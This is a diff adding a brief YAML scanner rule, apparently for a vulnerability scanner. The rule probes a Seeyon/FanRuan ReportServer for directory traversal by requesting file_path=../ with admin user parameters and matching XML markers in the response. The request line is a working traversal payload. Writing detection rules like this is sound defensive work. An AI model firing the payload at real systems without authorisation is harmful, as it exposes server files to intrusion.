@@ -1,0 +1,8 @@
+name: seeyon-fanruan-report-server-directory-travesal
+rules:
+  - method: GET
+    path: "/seeyonreport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../&currentUserName=admin&currentUserId=1&isWebReport=true"
+    expression: |
+      response.status == 200 && response.body.bcontains(b'<NODES') && response.body.bcontains(b'</NODES>') && response.body.bcontains(b'xmlVersion') && response.body.bcontains(b'releaseVersion')
+detail:
+  author: 666
